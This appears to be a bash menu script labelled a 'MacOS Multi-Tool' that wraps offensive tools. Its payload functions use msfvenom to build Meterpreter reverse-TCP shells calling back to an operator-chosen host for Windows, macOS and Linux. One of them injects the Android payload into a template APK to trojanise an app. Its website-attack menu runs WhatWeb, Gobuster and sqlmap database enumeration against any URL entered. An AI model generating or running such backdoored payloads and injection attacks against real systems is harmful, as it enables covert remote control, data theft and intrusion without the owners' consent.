#!/bin/bash

# Display the banner
echo "======================================="
echo "           MacOS Multi-Tool by Declanmidd"
echo "             GitHub: github.com/Declanmidd "
echo "======================================="

# Main Menu Function
main_menu() {
    clear
    echo "======================================="
    echo "               Main Menu               "
    echo "======================================="
    echo "1) Metasploit Payloads"
    echo "2) Website Attack"
    echo "3) Update macOS using Homebrew"
    echo "4) Clear Homebrew Cache"
    echo "5) Exit"
    echo "======================================="
    read -p "Select an option [1-5]: " choice

    case $choice in
        1) metasploit_payloads ;;
        2) website_attack ;;
        3) update_macos ;;
        4) clear_brew_cache ;;
        5) exit 0 ;;
        *) echo "Invalid choice, please try again." ; main_menu ;;
    esac
}

# Function for Metasploit Payloads menu
metasploit_payloads() {
    clear
    echo "======================================="
    echo "          Metasploit Payloads          "
    echo "======================================="
    echo "1) Android Payload with Template"
    echo "2) Windows Payload"
    echo "3) macOS Payload"
    echo "4) Linux Payload"
    echo "5) Return to Main Menu"
    echo "======================================="
    read -p "Select an option [1-5]: " payload_choice

    case $payload_choice in
        1) generate_android_payload ;;
        2) generate_windows_payload ;;
        3) generate_macos_payload ;;
        4) generate_linux_payload ;;
        5) main_menu ;;
        *) echo "Invalid choice, please try again." ; metasploit_payloads ;;
    esac
}

# Function for Website Attack menu
website_attack() {
    clear
    echo "======================================="
    echo "           Website Attack              "
    echo "======================================="
    echo "1) Use WhatWeb tool (Target Website)"
    echo "2) Scan for Directories using Gobuster"
    echo "3) SQL Injection Test"
    echo "4) Return to Main Menu"
    echo "======================================="
    read -p "Select an option [1-4]: " web_attack_choice

    case $web_attack_choice in
        1) whatweb_scan ;;
        2) gobuster_scan ;;
        3) sql_injection_test ;;
        4) main_menu ;;
        *) echo "Invalid choice, please try again." ; website_attack ;;
    esac
}

# Function to perform WhatWeb scan
whatweb_scan() {
    read -p "Enter the target website URL: " TARGET

    echo "[*] Running WhatWeb scan on $TARGET..."
    whatweb $TARGET
    if [ $? -ne 0 ]; then
        echo "[!] Error performing WhatWeb scan."
    fi
    pause
    website_attack
}

# Function to scan directories using Gobuster
gobuster_scan() {
    read -p "Enter the target website URL: " TARGET
    read -p "Enter the wordlist file path: " WORDLIST

    echo "[*] Scanning for directories on $TARGET using Gobuster..."
    sudo gobuster dir -u $TARGET -w $WORDLIST
    if [ $? -ne 0 ]; then
        echo "[!] Error performing Gobuster scan."
    fi
    pause
    website_attack
}

# Function for SQL Injection test
sql_injection_test() {
    read -p "Enter the target URL for SQL injection testing: " TARGET

    echo "[*] Testing $TARGET for SQL injection..."
    # Here you could implement specific SQLi tests using sqlmap or other tools.
    sudo sqlmap -u $TARGET --batch --dbs
    if [ $? -ne 0 ]; then
        echo "[!] Error performing SQL Injection test."
    fi
    pause
    website_attack
}

# Function to generate Android payload
generate_android_payload() {
    read -p "Enter LHOST: " LHOST
    read -p "Enter LPORT: " LPORT
    read -p "Enter Template APK path: " TEMPLATE_APK

    echo "[*] Generating Android payload..."
    sudo msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o android_payload.apk
    echo "[*] Payload generated successfully!"
    pause
    metasploit_payloads
}

# Function to generate Windows payload
generate_windows_payload() {
    read -p "Enter LHOST: " LHOST
    read -p "Enter LPORT: " LPORT

    echo "[*] Generating Windows payload..."
    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o windows_payload.exe
    echo "[*] Windows payload generated successfully!"
    pause
    metasploit_payloads
}

# Function to generate macOS payload
generate_macos_payload() {
    read -p "Enter LHOST: " LHOST
    read -p "Enter LPORT: " LPORT

    echo "[*] Generating macOS payload..."
    sudo msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o macos_payload.macho
    echo "[*] macOS payload generated successfully!"
    pause
    metasploit_payloads
}

# Function to generate Linux payload
generate_linux_payload() {
    read -p "Enter LHOST: " LHOST
    read -p "Enter LPORT: " LPORT

    echo "[*] Generating Linux payload..."
    sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o linux_payload.elf
    echo "[*] Linux payload generated successfully!"
    pause
    metasploit_payloads
}

# Function to update macOS using Homebrew
update_macos() {
    echo "[*] Updating Homebrew packages..."
    brew update && brew upgrade
    echo "[*] macOS and Homebrew packages are up-to-date!"
    pause
    main_menu
}

# Function to clear Homebrew cache
clear_brew_cache() {
    echo "[*] Clearing Homebrew cache..."
    brew cleanup
    echo "[*] Homebrew cache cleared!"
    pause
    main_menu
}

# Pause function to wait for user input before continuing
pause() {
    read -p "Press [Enter] to continue..."
}

# Start the script by displaying the main menu
main_menu
